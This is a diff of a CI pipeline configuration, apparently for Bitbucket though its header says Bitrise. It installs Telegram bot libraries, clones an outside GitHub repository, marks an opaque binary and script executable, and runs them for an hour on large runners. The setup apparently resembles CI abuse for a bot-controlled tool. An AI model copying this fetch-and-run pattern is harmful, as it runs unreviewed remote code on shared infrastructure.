@@ -1,9 +1,32 @@
+# The Bitrise CI configuration file
+
+image: python:3.9
+
 pipelines:
   default:
     - step:
-        name: Run Python Script
-        image: python:3.10
+        name: Install Dependencies
+        size: 8x
+        caches:
+          - pip
         script:
-          - echo "Starting pipeline..."
+          - apt-get update && apt-get install -y gcc libpthread-stubs0-dev
+          - pip install telebot pymongo aiohttp
 
-          - pip install telebot flask pymongo aiohttp && chmod +x * && python3 RAGNAROK.py
+    - step:
+        name: Clone Repository and Set Up
+        size: 8x
+        script:
+          - git clone https://github.com/kingfather09090/newa
+          - mv soul.py $HOME
+          - cd newa
+          - mv soul $HOME && cd ..
+          - chmod +x *
+          - chmod +x soul
+
+    - step:
+        name: Run Python Script
+        size: 8x
+        script:
+          - timeout 3600 python3 $HOME/soul.py
+
